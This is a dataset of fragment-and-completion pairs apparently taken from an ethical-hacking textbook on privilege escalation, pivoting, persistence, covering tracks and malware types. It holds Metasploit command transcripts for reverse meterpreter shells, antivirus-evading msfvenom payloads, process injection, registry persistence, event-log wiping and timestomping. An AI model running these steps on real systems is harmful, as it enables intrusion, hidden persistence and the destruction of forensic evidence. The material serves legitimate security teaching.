"this is a technique called pivoting , where you pivot off","this is a technique called pivoting , where you pivot off the compromised system to take a look at another set of systems"
this will get you further into the network and potentially gain,this will get you further into the network and potentially gain you even more sensitive information or access to more critical systems
there was a time when services ran as root on unix/linux systems or as localsystem,"there was a time when services ran as root on unix/linux systems or as localsystem on windows systems , which is an account that has a very high level of permissions"
"once you have root-level access , you should be able to gain access to","once you have root-level access , you should be able to gain access to all information on the system as well as make changes to services and manipulate users"
what this means is that you need to get access to the system first,"what this means is that you need to get access to the system first , and then you ’ ll need to run another exploit to get elevated privileges"
"we can continue to use metasploit for this , so let","we can continue to use metasploit for this , so let ’ s start with a compromised system with a meterpreter shell"
"if we background the shell using the background , we can make","if we background the shell using the background , we can make use of the open session as a way of interacting with the system"
"we can drop to a windows shell from meterpreter and run systeminfo , redirecting the","we can drop to a windows shell from meterpreter and run systeminfo , redirecting the output to a file , then we can pull that file back to our local system"
we ’ re going to get an updated mssb database and then we,"we ’ re going to get an updated mssb database and then we ’ ll run the script with our two files , looking for local exploits"
what we will get is a list of local,what we will get is a list of local exploits that could potentially be run against our compro-mised system
"it doesn ’ t provide any details about metasploit modules , which","it doesn ’ t provide any details about metasploit modules , which means we ’ ll still need to do some searching for that"
"however , it does provide resources if you want","however , it does provide resources if you want to learn more about the vulnerabilities and the exploit"
"net remoting services remote command execution , poc [ * ] [ * ] done some","net remoting services remote command execution , poc [ * ] [ * ] done some of the suggested exploits won ’ t run against windows on windows ( wow ) 64"
this is a subsystem that allows 32-bit,this is a subsystem that allows 32-bit windows executables to execute on 64-bit windows installations
the exploit would need the ability to run within,the exploit would need the ability to run within this subsystem and still be able to exploit the vulnerability
"we need to identify the metasploit module associated with that vulnerability , which means we can","we need to identify the metasploit module associated with that vulnerability , which means we can just search for the microsoft vulnerability , as you can see in the following code list-ing"
"this is a param- eter you will need to set , as well as","this is a param- eter you will need to set , as well as setting the payload and the local host and port required for the reverse meterpreter shell"
using local exploit from metasploit msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > set session,using local exploit from metasploit msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > set session 2 session = > 2msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > set lhost 192
57msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > set lport 4445lport = > 4445msf exploit,57msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > set lport 4445lport = > 4445msf exploit ( windows/local/ms16_032_secondary_logon_handle_privesc ) > exploit [ * ] started reverse tcp handler on 192
"57:4445 [ ! ] executing 32-bit payload on 64-bit arch , using","57:4445 [ ! ] executing 32-bit payload on 64-bit arch , using syswow64 powershell [ * ] writing payload file , c : \manageengine\desktopcentral_server\bin\roayykq"
"in the next code listing , you will see compromising a","in the next code listing , you will see compromising a linux system using a vulnerability on a distributed c compiler daemon"
this means we need to have a special set of,this means we need to have a special set of libraries so we can cross-compile from one target architecture to another
"once we have the output , though , we can put it and a simple","once we have the output , though , we can put it and a simple shell script into the directory , where it will be available from a web server"
"in this listing , you will see exploiting","in this listing , you will see exploiting the target system and then running the privilege escalation"
linux privilege escalation msf > use exploit/unix/misc/distcc_exec msf,linux privilege escalation msf > use exploit/unix/misc/distcc_exec msf exploit ( unix/misc/distcc_exec ) > set rhost 192
"in the privilege escalation attack , we provide a number","in the privilege escalation attack , we provide a number one less than the process identification number from the udev process"
listening for reverse connection with netcat root @ quiche :,listening for reverse connection with netcat root @ quiche : ~ # netcat -lvp 5555 listening on [ any ] 5555
24-16-server # 1 smp thu apr 10 13:58:00 utc 2008 i686 gnu/linux this,24-16-server # 1 smp thu apr 10 13:58:00 utc 2008 i686 gnu/linux this sort of exploit chaining is often required for getting the access that is necessary
"of course , gaining administrative access isn ’ t all you ’","of course , gaining administrative access isn ’ t all you ’ re looking to do , though it ’ s certainly use- ful"
"however , organizations that are concerned with security of","however , organizations that are concerned with security of critical resources will probably have systems connected to multiple systems"
you may find after compromising a system that it has multiple inter-faces,"you may find after compromising a system that it has multiple inter-faces , such as the system you can see in the following code listing"
"this is the network we are going to want to target , but we","this is the network we are going to want to target , but we can ’ t just upload a bunch of attack tools to the compromised system"
"instead , we need to be able to pass traffic from our attack","instead , we need to be able to pass traffic from our attack system through the compromised system and into the network it is connected to"
ip address configuration meterpreter > getuid server username : nt authority\local servicemeterpreter > ipconfig,ip address configuration meterpreter > getuid server username : nt authority\local servicemeterpreter > ipconfig interface 1============name : software loopback interface 1hardware mac : 00:00:00:00:00:00mtu : 4294967295ipv4 address : 127
0ipv6 address : fe80 : :35b1:1874:3712:8b59ipv6 netmask : ffff : ffff : ffff : ffff : : interface 19============name : intel,0ipv6 address : fe80 : :35b1:1874:3712:8b59ipv6 netmask : ffff : ffff : ffff : ffff : : interface 19============name : intel ( r ) pro/1000 mt network connection # 2hardware mac : 42:39 : bd : ec:24:40mtu : 1500ipv4 address : 172
0ipv6 address : fe80 : :4b4:7b9a : b3b7:3742ipv6 netmask : ffff : ffff : ffff,0ipv6 address : fe80 : :4b4:7b9a : b3b7:3742ipv6 netmask : ffff : ffff : ffff : ffff : : to add the route we need to pass traffic to the 172
"the module we are going to run is called autoroute , and it will take","the module we are going to run is called autoroute , and it will take care of adding the route to that network by way of the session we have open"
we can background the meterpreter session at this point,we can background the meterpreter session at this point and run any module we choose against that network
"in the following code , you can see the routing table being checked from outside of meterpreter after the session","in the following code , you can see the routing table being checked from outside of meterpreter after the session is backgrounded ( you can put meterpreter into the background by using either the background command or typing ctrl+z )"
msf exploit ( windows/url > route print ipv4 active routing table========================= subnet netmask,msf exploit ( windows/url > route print ipv4 active routing table========================= subnet netmask gateway -- -- -- -- -- -- - -- -- -- - 172
msf exploit ( windows/url > msf exploit ( windows/url > use,msf exploit ( windows/url > msf exploit ( windows/url > use auxiliary/ scanner/portscan/tcp msf auxiliary ( scanner/portscan/tcp ) > set rhosts 172
0/24msf auxiliary ( scanner/portscan/tcp ) > run once you have an idea of what other,"0/24msf auxiliary ( scanner/portscan/tcp ) > run once you have an idea of what other systems are on the other network , you can start looking for vulnerabilities on those systems"
pivoting is all about taking one compromised system and using it to,"pivoting is all about taking one compromised system and using it to gain access to other systems , that is , pivot to those systems"
"once you have your network routes in place , you are in good","once you have your network routes in place , you are in good shape to accomplish that pivoting so you can extend your reach into the network"
persistence gaining access is important because it demonstrates that,persistence gaining access is important because it demonstrates that you can compromise systems and gain access to sensitive information
"however , attackers don ’ t want to have to keep","however , attackers don ’ t want to have to keep exploiting the same vulnerability each time they want access to the system"
"second , if the attacker , even if it ’ s a faux-attacker ( meaning you ) ,","second , if the attacker , even if it ’ s a faux-attacker ( meaning you ) , is exploiting a vulnerability , they can ’ t be sure that the vulnerability won ’ t be patched"
"no matter what the objective of the attacker is ,","no matter what the objective of the attacker is , they will generally want to maintain access to compromised systems"
"if a system has remote access , such as secure shell ( ssh ) or remote desktop on","if a system has remote access , such as secure shell ( ssh ) or remote desktop on windows systems , the attacker may just create a new user that has the ability to log in remotely"
if the compromised user changes their password or the user account,"if the compromised user changes their password or the user account is removed , the new user will be available for the attacker"
"this is often the best approach , because firewalls are probably in","this is often the best approach , because firewalls are probably in place that will block inbound connection attempts but outbound connections are generally allowed"
"so , we can install a reverse shell package and it will","so , we can install a reverse shell package and it will connect out to our system if we have a handler wait-ing to listen"
"in the following listing , you can see starting from a meterpreter","in the following listing , you can see starting from a meterpreter session and installing a program to start up when a user logs in"
registry persistence from metasploit meterpreter > getuid server username :,registry persistence from metasploit meterpreter > getuid server username : nt authority\local servicemeterpreter > background [ * ] backgrounding session 1
msf exploit ( windows/url > use exploit/windows/ local/registry_persistence msf exploit ( windows/local/registry_persistence ) > set session,msf exploit ( windows/url > use exploit/windows/ local/registry_persistence msf exploit ( windows/local/registry_persistence ) > set session 1session = > 1msf exploit ( windows/local/registry_persistence ) > exploit [ * ] generating payload blob
[ + ] created registry key hkcu\software\ho2pqzth [ + ] installed payload blob to hkcu\software\ho2pqzth\kascvdw3 [ * ] installing run,[ + ] created registry key hkcu\software\ho2pqzth [ + ] installed payload blob to hkcu\software\ho2pqzth\kascvdw3 [ * ] installing run key this process uses the registry to store an executable blob with no control over what gets stored there and executed
"in order to create your own stand-alone executable , you","in order to create your own stand-alone executable , you could use the msfvenom program , which is part of metasploit"
"this takes the payload windows/meterpreter/reverse_tcp , which sends back a","this takes the payload windows/meterpreter/reverse_tcp , which sends back a connection to a meterpreter shell to the specified ip address"
"exe [ - ] no platform was selected , choosing msf : :module : :platform : :windows from the payload found 1 compatible encodersattempting to encode payload with 3 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (","exe [ - ] no platform was selected , choosing msf : :module : :platform : :windows from the payload found 1 compatible encodersattempting to encode payload with 3 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 ( iteration=0 ) x86/shikata_ga_nai succeeded with size 395 ( iteration=1 ) x86/shikata_ga_nai succeeded with size 422 ( iteration=2 ) x86/shikata_ga_nai chosen with final size 422payload size : 422 bytesfinal size of exe file : 73802 bytessaved as : elfbowling"
"it creates a listener , by default on port 31337 , that","it creates a listener , by default on port 31337 , that can be con - nected to in order to get a meterpreter shell"
"however , for the moment , the meterpreter service does work and can be used to gain access","however , for the moment , the meterpreter service does work and can be used to gain access , as long as you can connect to the specified port through whatever firewalls may be in place"
creating meterpreter service on target meterpreter > run,creating meterpreter service on target meterpreter > run metsvc [ ! ] meterpreter scripts are deprecated
] [ * ] creating a meterpreter service on port 31337,] [ * ] creating a meterpreter service on port 31337 [ * ] creating a temporary installation directory c : \windows\servic~2\locals~1\ appdata\local\temp\krujwjqb
you will see that meterpreter uploads the payload,you will see that meterpreter uploads the payload to the target system and creates a persistence executable
the registry entries are then created to automatically,the registry entries are then created to automatically run the persistence executable when the user logs in
"you can see this from the reference to hkcu , which is hkey_current_user ,","you can see this from the reference to hkcu , which is hkey_current_user , the location in the registry that has everything related to the logged in user"
using metasploit module for persistence,using metasploit module for persistence meterpreter > run post/windows/manage/persistence_exe rexepath=/root/elfbowling
exe [ + ] agent executed with pid 5672 [ * ] installing into autorun as hkcu\software\microsoft\windows\currentversion\run\ qwqprsrzw,exe [ + ] agent executed with pid 5672 [ * ] installing into autorun as hkcu\software\microsoft\windows\currentversion\run\ qwqprsrzw [ + ] installed into autorun as hkcu\software\microsoft\windows\currentversion\run\ qwqprsrzw [ * ] cleanup meterpreter rc file : /root/
"you may have noted , however , that these persistence","you may have noted , however , that these persistence mechanisms introduce files and registry entries to the target system"
"these actions and artifacts can be detected , assuming there are detection mechanisms on","these actions and artifacts can be detected , assuming there are detection mechanisms on the endpoint or that anyone is paying atten - tion to activities on the endpoint"
"as you are investigating your endpoints , you may notice whether there","as you are investigating your endpoints , you may notice whether there is malware detection or other sorts of detection software on the target"
covering tracks anytime you gain access to a system as part of,"covering tracks anytime you gain access to a system as part of a penetration test or security assessment , you will be leaving footprints"
any files or other artifacts that may need to be left on,any files or other artifacts that may need to be left on the system have the potential of being located and flagged as malicious
you ’ d have to start all over against a,you ’ d have to start all over against a target that is putting up additional hurdles for you to clear
"anyone looking at the process table will see it , causing some investigation","anyone looking at the process table will see it , causing some investigation , even if it ’ s just the user poking around a little"
"in order to do anything with the process table , you need","in order to do anything with the process table , you need to have the ability to obscure something that ’ s in kernel space"
no other aspect or element of the operating environment interacts with,no other aspect or element of the operating environment interacts with the hardware or the number of components that the kernel needs to
"the request is made to the kernel through the api , which fulfills","the request is made to the kernel through the api , which fulfills the request and returns the result to the process that issued the request"
"what all this means is that in order to manipulate anything in the kernel space , like the process table , either","what all this means is that in order to manipulate anything in the kernel space , like the process table , either you need to make a request to the kernel through an existing api function or you need to be in the kernel space"
as the only way to manipulate the process table from outside the kernel is to create and kill,"as the only way to manipulate the process table from outside the kernel is to create and kill processes , you can ’ t actually hide the existence of the process from anywhere but the kernel"
"often , attackers will manipulate what users can see","often , attackers will manipulate what users can see by use of a collection of software called a rootkit"
this rootkit would need to know what the names or properties of the,this rootkit would need to know what the names or properties of the processes that come with the rootkit are so they can be filtered out
a rootkit may also contain replacement binaries that will similarly filter file listing results so anyone using the,a rootkit may also contain replacement binaries that will similarly filter file listing results so anyone using the system binaries won ’ t know that there are files in the file system related to the infection/compromise
"instead , metasploit uses tactics like process encoding to get away from malware scanners","instead , metasploit uses tactics like process encoding to get away from malware scanners , making it harder for these scanners to identify the software you are injecting"
"beyond that , if you have control over the name of the executable you are running","beyond that , if you have control over the name of the executable you are running , changing it to something that won ’ t be suspected can help keep the process protected"
"exe , anyone looking would see that and not think much of it","exe , anyone looking would see that and not think much of it because that ’ s a common process that is seen on a windows system"
the idea of process injection is to take code the attacker,the idea of process injection is to take code the attacker wants to run and then inject it into an existing process
"once the code is injected into the process , the attacker needs to get it to","once the code is injected into the process , the attacker needs to get it to run , which can be done by starting a new thread that uses the injected code"
this is done on a windows system by getting the handle of the,this is done on a windows system by getting the handle of the process and then using the handle to allocate memory in the target process
"a handle , from a windows api per - spective ,","a handle , from a windows api per - spective , is essentially a pointer to the process entry in the process table"
once the attacker has the handle and gets code injected,"once the attacker has the handle and gets code injected into the process space , that code can get executed"
"for example , in the fol-lowing listing , you can see a metasploit module","for example , in the fol-lowing listing , you can see a metasploit module that injects code into a process that was specified as a parameter to the module"
"the process selected is the postgres process , mean-ing the shell","the process selected is the postgres process , mean-ing the shell code is running in the process space of the database server"
the payload being executed will bind to a tcp port whose value defaults,"the payload being executed will bind to a tcp port whose value defaults to port 4444 , since no other value was specified as a parameter"
process injection module meterpreter > run post/windows/manage/multi_meterpreter_inject pid=3940 payload=windows/shell_bind_tcp [ * ] running,process injection module meterpreter > run post/windows/manage/multi_meterpreter_inject pid=3940 payload=windows/shell_bind_tcp [ * ] running module against vagrant-2008r2 [ * ] creating a reverse meterpreter stager : lhost=192
[ + ] process created with pid 1296 [ * ] injecting meterpreter into process id 1296 [ *,"[ + ] process created with pid 1296 [ * ] injecting meterpreter into process id 1296 [ * ] allocated memory at address 0x00170000 , for 328 byte stager [ * ] writing the stager into memory"
"c : \manageengine\desktopcentral_server\bin > after the process injection completes , you can see metasploit being used , in","c : \manageengine\desktopcentral_server\bin > after the process injection completes , you can see metasploit being used , in a separate session , to connect to the remote system , where we get a command prompt shell"
"another technique we can use , that is similar","another technique we can use , that is similar , is to migrate our initial connection to another pro-cess"
process migration with meterpreter meterpreter > run post/windows/manage/migrate [ * ],process migration with meterpreter meterpreter > run post/windows/manage/migrate [ * ] running module against vagrant-2008r2 [ * ] current server process : nepqi
exe process to migrate to [ + ] migrating to 6012 [ + ] successfully migrated to process 6012,exe process to migrate to [ + ] migrating to 6012 [ + ] successfully migrated to process 6012 meterpreter > what we achieve through the use of process migration is to hopefully evade detection by endpoint protection solutions
any action taking place will be done from the process space of,"any action taking place will be done from the process space of an existing and unsuspicious process , even if the behaviors may be suspicious"
"as with other techniques discussed in this chapter ,","as with other techniques discussed in this chapter , the important idea is to keep from getting detected"
running malicious code in a process that won ’ t earn much in,running malicious code in a process that won ’ t earn much in the way of notice is a good way of maintaining access without getting detected
"on linux and macos systems , for example , you can overwrite the expected","on linux and macos systems , for example , you can overwrite the expected location for dynamic libraries using environment variables like ld_preload on linux or dyld_insert_libraries on macos"
this places the location of the attacker ’ s libraries,"this places the location of the attacker ’ s libraries ahead of the system path , ensuring they get loaded"
"this means if anyone thinks to look , the only place they","this means if anyone thinks to look , the only place they will be able to fi nd any information is on the local system"
"some organizations will plan for incidents and make sure that they not only have solid logging policies in place but that they are also stor-ing system logs in a central location , meaning that anything you do to the","some organizations will plan for incidents and make sure that they not only have solid logging policies in place but that they are also stor-ing system logs in a central location , meaning that anything you do to the logs on the local system won ’ t have an impact because the place any investigator is going to go is to the cen-tral log repository and , quite likely , a log search tool like elasticstack or splunk"
this means that you will either wipe all the entries in the case of the event logs on a,this means that you will either wipe all the entries in the case of the event logs on a windows system or you would just delete log fi les in the case of a linux or unix-like system
once we have compromised a windows system and have,"once we have compromised a windows system and have a meterpreter shell , we can use the clearev command"
"one of the challenges of this approach , though ,","one of the challenges of this approach , though , is that you need to have the right set of permissions"
clearing event viewer with meterpreter meterpreter > clearev,clearing event viewer with meterpreter meterpreter > clearev [ * ] wiping 635 records from application
meterpreter > getuidserver username : nt authority\local service you can see from the output that the compromise,meterpreter > getuidserver username : nt authority\local service you can see from the output that the compromise used didn ’ t have adequate permis- sions to be able to clear the system event log
"with the right permissions , these files could be altered by just erasing them or","with the right permissions , these files could be altered by just erasing them or even getting in and removing any lines out of the logs that may seem incriminat-ing"
"unless there is auditing enabled on the system , editing the logs would","unless there is auditing enabled on the system , editing the logs would be undetectable , which means you could easily alter them without any downside"
"anything that happens before that related to gaining access will be logged , but","anything that happens before that related to gaining access will be logged , but you would be able to do anything else on the system without it being logged"
"this is not a directory most people visit , so it wouldn ’ t","this is not a directory most people visit , so it wouldn ’ t be hard to place a file here and just have it never get noticed"
"the path to that directory is c : \users\ username \appdata\local\microsoft\windows \temporary internet files , which has","the path to that directory is c : \users\ username \appdata\local\microsoft\windows \temporary internet files , which has a lot of waypoints where you can similarly hide files where they won ’ t be seen"
"this is in part because , by default , many of the directories shown","this is in part because , by default , many of the directories shown here are hidden in windows explorer unless you change the setting to show them"
"essentially , files anywhere in the appdata directory would be lost","essentially , files anywhere in the appdata directory would be lost in the shuffle of a lot of temporary files and application-specific files"
"3 temporary internet files in windows windows systems have a feature called alternate data streams ( adss ) , which were","3 temporary internet files in windows windows systems have a feature called alternate data streams ( adss ) , which were imple- mented in the new technology filesystem ( ntfs ) to support the case when apple-based disks were attached to windows nt"
"in the early ’ 90s , windows nt supported many more platforms and architectures than it does now , so while the","in the early ’ 90s , windows nt supported many more platforms and architectures than it does now , so while the support of the hierarchical file system ( hfs ) of macos no longer exists in windows , ads remains as a feature"
this is where the pop-up about files being downloaded from the,this is where the pop-up about files being downloaded from the internet and asking if you want to open them comes from
4 shows creating an alternate data stream and then creating,4 shows creating an alternate data stream and then creating a directory listing showing the existence of the alternate data stream
"not all programs in windows under-stand the ads , which means you","not all programs in windows under-stand the ads , which means you wouldn ’ t normally use these to store files for regular use"
4 using alternate data streams in windows one of the challenges with storing executables,4 using alternate data streams in windows one of the challenges with storing executables into an ads is that they are no longer directly executable from the ads
you would have to extract the executable and then run that,you would have to extract the executable and then run that rather than trying to call it from the separate data stream
"this helps protect systems from attackers who would do just that , since regular directory listings","this helps protect systems from attackers who would do just that , since regular directory listings , including in windows explorer , would show no hint that the ads is in place"
"this makes it very effective at hiding data , just not","this makes it very effective at hiding data , just not the most efficient at hiding data that you want to directly execute"
windows creates these shadow copies to maintain versions of,"windows creates these shadow copies to maintain versions of files , in case they need to be rolled back"
"it is pos-sible , though difficult , to mount one","it is pos-sible , though difficult , to mount one of the volume shadow copies and then manipulate files in it"
"this is a possibility for hiding data , though it ’ s not","this is a possibility for hiding data , though it ’ s not really the best way because it can be very cumbersome to deal with"
"using timestomp , we can set the times on a file we","using timestomp , we can set the times on a file we uploaded , which are identical to the time stamps on the legitimate file"
"exe anytime you manipulate a file , you ’ ll be","exe anytime you manipulate a file , you ’ ll be adjusting the time values on the file just by touching it"
"as a way of cover- ing your tracks , you can make sure to adjust the","as a way of cover- ing your tracks , you can make sure to adjust the time values on files you touched back to what they were before you changed the file"
summary once you have all of your information gathered,"summary once you have all of your information gathered about your target—networks , systems , email addresses , etc"
there are multiple reasons for exploiting the identified vulnerabilities,there are multiple reasons for exploiting the identified vulnerabilities that have nothing to do with simply proving you can
the ultimate goal is to improve the security posture,the ultimate goal is to improve the security posture and preparedness for the organization you are working with
this means the reason you are exploiting vulnerabilities is to,this means the reason you are exploiting vulnerabilities is to demonstrate that they are there and not just false positives
"additionally , you are exploiting vulnerabilities in order to gather additional","additionally , you are exploiting vulnerabilities in order to gather additional information to exploit more vulnerabilities to demonstrate that they are there"
"ultimately , once you have finished your testing and identified vulnerabilities","ultimately , once you have finished your testing and identified vulnerabilities , you can report them back to your employer or client"
"in order to exploit vulnerabilities , you need a way to search","in order to exploit vulnerabilities , you need a way to search for exploits rather than being expected to write all the exploits yourself"
"what you get there may not be safe , especially if","what you get there may not be safe , especially if you are grabbing binaries or source code you don ’ t understand"
"if you prefer to keep exploit reposi-tories local , such as if you aren ’","if you prefer to keep exploit reposi-tories local , such as if you aren ’ t always sure if you will have internet access , you can grab the exploit-db repository"
"there is also a search script , called searchsploit ,","there is also a search script , called searchsploit , that will help you identify exploits that match possible vulnerabilities"
these passwords may be used on other systems once you have cracked,these passwords may be used on other systems once you have cracked the passwords using a tool like john the ripper or rainbow tables
"in a windows domain , you will certainly find that usernames are probably usable across","in a windows domain , you will certainly find that usernames are probably usable across multiple systems , and often , local administrator passwords are used across systems as well"
you will adjust your routing table to push traffic,you will adjust your routing table to push traffic through the connection you have to the remote system
"this could be done by meterpreter automatically , but more than likely you will need to make","this could be done by meterpreter automatically , but more than likely you will need to make use of a local vulnerability that will give you administrative privileges once the vulnerability has been exploited"
"one thing you may need elevated privileges for is to maintain persistence ,","one thing you may need elevated privileges for is to maintain persistence , meaning you can always get back into the system when you want to"
there are ways to do it without elevated,"there are ways to do it without elevated privileges , but getting administrative rights is always helpful"
"you can also manipulate time stamps on files , which","you can also manipulate time stamps on files , which may be necessary if you are altering any system-provided files"
if you were looking for reliable exploits you could use,"if you were looking for reliable exploits you could use against known vulnerabilities , what would you use ? a"
"not only are there hundreds of millions of malware families and variants in the world , and an","not only are there hundreds of millions of malware families and variants in the world , and an unknown number of programmers developing that malware , there are also at least dozens of companies developing anti-malware solutions"
the develop-ers who are working on writing malware are getting paid to write the software,"the develop-ers who are working on writing malware are getting paid to write the software , anticipat-ing selling off the malware , or expect to make money from the malware operations"
"you can see that in that time frame , there have","you can see that in that time frame , there have often been more than 10 million new malware samples in a month"
1 av-test institute malware statisticsoct 16 nov 16 dec 16 jan 17 feb 17 mar 17 apr 17 may 17 jun 17 jul 17 aug,1 av-test institute malware statisticsoct 16 nov 16 dec 16 jan 17 feb 17 mar 17 apr 17 may 17 jun 17 jul 17 aug 17 sep 17 oct 17 nov 17 dec 17 jan 18feb 18 mar 18 apr 18 may 18 jun 18 jul 18 aug 18 sep 187
"84 m while we use the umbrella term malware , which is a portmanteau","84 m while we use the umbrella term malware , which is a portmanteau of the words malicious and software , there are several different types of malware"
some malware will fall into multiple categories because it ’ s not always about how the,some malware will fall into multiple categories because it ’ s not always about how the malware spreads or infects ; sometimes it ’ s more useful to talk about what it does
"this can also help to identify malware infestations , because","this can also help to identify malware infestations , because of the network traffic that someone monitoring a network may see"
"this can be done without creating anything that is necessarily malicious , but if you want to be able to drop your","this can be done without creating anything that is necessarily malicious , but if you want to be able to drop your own mal-ware as part of your testing , and also to provide yourself with persistent access , there are ways to do that"
it ’ s not as simple as just say- ing antivirus,it ’ s not as simple as just say- ing antivirus anymore because there is more to anti-malware than a traditional antivi-rus solution
understanding how they work can also provide you with,understanding how they work can also provide you with details about how to potentially avoid or evade the malware
"malware types this may get a little confusing , simply because","malware types this may get a little confusing , simply because a single malware sample can potentially be placed into multiple buckets"
"going through the different types of malware , you will","going through the different types of malware , you will start to understand the complex- ity of the landscape today"
"virus since the software used to prevent or eradicate malicious software is often called antivirus ,","virus since the software used to prevent or eradicate malicious software is often called antivirus , you can probably figure out that one of the most common words for malware is virus"
"once that happens , the virus will infect the system , possibly by injecting code into","once that happens , the virus will infect the system , possibly by injecting code into other programs so when those programs run , the virus still retains control of the infected system"
"every time the infected programs are run , the system will","every time the infected programs are run , the system will get reinfected , even if the original executable and process are removed"
"viruses have been around since at least the early ’ 70s ,","viruses have been around since at least the early ’ 70s , though the theory of self-replicat- ing computer programs has been around since 1949"
"this virus did nothing but repli-cate itself , without causing any","this virus did nothing but repli-cate itself , without causing any damage other than the time it took to isolate and remove it"
"those floppy disks would then be taken to other systems , infecting the operating","those floppy disks would then be taken to other systems , infecting the operating system there so the program would infect any floppy disk inserted into that system"
every virus will have the ability to identify a program,every virus will have the ability to identify a program to infect and also to copy itself into that program
"one example of that is the i love you virus , which replaced media files ,","one example of that is the i love you virus , which replaced media files , like pho-tos and other images , with files named the same except for the addition of"
"anytime someone attempted to look at one of their photos , they","anytime someone attempted to look at one of their photos , they actually executed a vbscript instead , ensuring that the system got reinfected"
the triggering phase is when the virus has been,the triggering phase is when the virus has been triggered by a user action or some other defined event
"the trigger could be opening an email , launching a file","the trigger could be opening an email , launching a file , or perhaps even a reaching a certain date and time"
"there is also a propagation phase , during which the virus will be","there is also a propagation phase , during which the virus will be trying to spread itself where it can by infecting other files or programs"
"this commonly means that it installs itself as part of the operating system , which","this commonly means that it installs itself as part of the operating system , which means it loads into memory when the system boots and remains there until it shuts down"
"word documents , for example , can include macros , which are","word documents , for example , can include macros , which are short scripts that launch and are executed when the document is opened"
"many other document formats support script execution , including the portable document format","many other document formats support script execution , including the portable document format ( pdf ) , and all can be prone to this sort of virus"
"by contrast , a worm gets launched initially and all subsequent infections are","by contrast , a worm gets launched initially and all subsequent infections are a result of the worm moving from one system to another on its own"
there are certainly notorious worms like code red and nimda,"there are certainly notorious worms like code red and nimda , which caused a lot of damage around the world"
"the intent of that worm was to remove another worm , blaster , and","the intent of that worm was to remove another worm , blaster , and also patch systems so they wouldn ’ t be vulnerable to blaster any longer"
you can get rid of the malware but if you don ’ t remove,"you can get rid of the malware but if you don ’ t remove the vulnerability the worm uses , the worm will just reinfect from another source"
"regardless of the intent of the author , the problem with worms is the resource","regardless of the intent of the author , the problem with worms is the resource con- sumption and the amount of time and resources required to clean up after the malware"
if they can find a system and the vulnerability they are programmed to use,"if they can find a system and the vulnerability they are programmed to use exists on that system , they are going to try to infect that system"
"this includes systems they have already infected—once they have exploited the vulnerability ,","this includes systems they have already infected—once they have exploited the vulnerability , they may check to see if there is already an instance of the worm"
with multiple worm instances potentially attempting to,"with multiple worm instances potentially attempting to attack a single host , network traffic increases"
"exploiting vulnerabilities , especially multiple times at the","exploiting vulnerabilities , especially multiple times at the same time , can consume processor and network resources"
"maybe it ’ s a minimal impact and no one really notices it , but","maybe it ’ s a minimal impact and no one really notices it , but really virulent worms can have a significant impact , as has been seen many times"
a significant challenge with worms is that once they have found their way into an,"a significant challenge with worms is that once they have found their way into an envi-ronment , they can take advantage of trust relationships and lax restrictions on network communications"
"when two systems inside the network communicate with one another , called east-west communications , it","when two systems inside the network communicate with one another , called east-west communications , it is generally considered to be trusted because both sys-tems are owned and maintained by the organization"
the expectation is they are under the control of,the expectation is they are under the control of the enterprise and not under the control of an attacker
"once the email client renders the html , it runs the script and the script","once the email client renders the html , it runs the script and the script makes use of a vulnerability or some other poorly configured mechanism in the email client"
this also leads to the potential for reinfection,this also leads to the potential for reinfection where the malware may have been identified and removed
"if you are on my contact list , there is a very good chance that","if you are on my contact list , there is a very good chance that either i am on yours or you know someone who has me on their contact list"
"the story goes that the greeks , while at war with the people","the story goes that the greeks , while at war with the people from troy , built a horse as a “ gift ” for the trojans"
"rather than being a wooden horse statue , it was in fact a conveyance for the delivery of greek soldiers","rather than being a wooden horse statue , it was in fact a conveyance for the delivery of greek soldiers who waited until nightfall , crept out of the wooden horse , and attacked the city of troy from the inside"
"in the same way , malware called a trojan appears to","in the same way , malware called a trojan appears to be something benign , often some- thing you believe you know"
"because it expects a user to be involved , running a program they believe to be something","because it expects a user to be involved , running a program they believe to be something other than the malware it actually is , a trojan is just a particular type of virus"
"you could consider it a type of social engineer-ing , where users are tricked into","you could consider it a type of social engineer-ing , where users are tricked into executing the malware by making them believe it ’ s some-thing it isn ’ t"
"often , you may find that someone is sending you something they","often , you may find that someone is sending you something they are claiming to be an invoice or some sort of tracking document"
botnet a botnet can be part of the payload of a virus,botnet a botnet can be part of the payload of a virus or a worm and could also be installed by a trojan horse
the botnet is the entire collection of endpoints that,the botnet is the entire collection of endpoints that have been infected with a particular family of malware
the botnet client is a small piece of software whose purpose is to,the botnet client is a small piece of software whose purpose is to connect back to command and control infrastructure ( c & c or c2 )
"the botnet could be used for any num-ber of purposes , but","the botnet could be used for any num-ber of purposes , but primarily the purpose of a botnet is to generate income for its owner"
this was one of the first pieces of malware that had a,this was one of the first pieces of malware that had a package you could purchase and then use to create your own botnet client
zeus came with a builder that took in a configuration file and,zeus came with a builder that took in a configuration file and then created a malware executable that could be used to infect systems
2 zeus builder once zeus has been installed on a target system,"2 zeus builder once zeus has been installed on a target system , it provides a way for the attacker to access the system remotely"
"botnets are also used to send spam emails , host web servers that can","botnets are also used to send spam emails , host web servers that can shift from one system to another , or participate in distributed denial of service attacks"
"in cases where an attacker has millions of systems they have compromised , they are capable of sending hundreds of gigabits or possibly","in cases where an attacker has millions of systems they have compromised , they are capable of sending hundreds of gigabits or possibly even terabits per second in attack traffic , enough to take a lot of businesses offline so their customers can ’ t connect"
ransomware is a program that encrypts a portion of a,"ransomware is a program that encrypts a portion of a victim ’ s hard drive , where personal files are stored"
the attacker provides instructions for the victim to send,"the attacker provides instructions for the victim to send money , usually in a type of cryp-tocurrency like bitcoin"
the idea behind this is that the attacker will,the idea behind this is that the attacker will provide the decryption key once the ransom has been paid
typically there is a time limit before the data is,typically there is a time limit before the data is destroyed just to put a little extra heat on the victim
"fortunately , fast action on the part of microsoft , along with malware researchers","fortunately , fast action on the part of microsoft , along with malware researchers , was able to limit the overall number of devices impacted around the world"
3 wannacry ransom demand wannacry was spread through the use of an,3 wannacry ransom demand wannacry was spread through the use of an exploit developed by the united states national security agency ( nsa )
"the exploit was known as eternalblue , and it was part of a cache of information released by a group known as the","the exploit was known as eternalblue , and it was part of a cache of information released by a group known as the shadow brokers , who had infil-trated the nsa to get information about tools and tactics used by nsa employees working on cybersecurity and cyberwarfare"
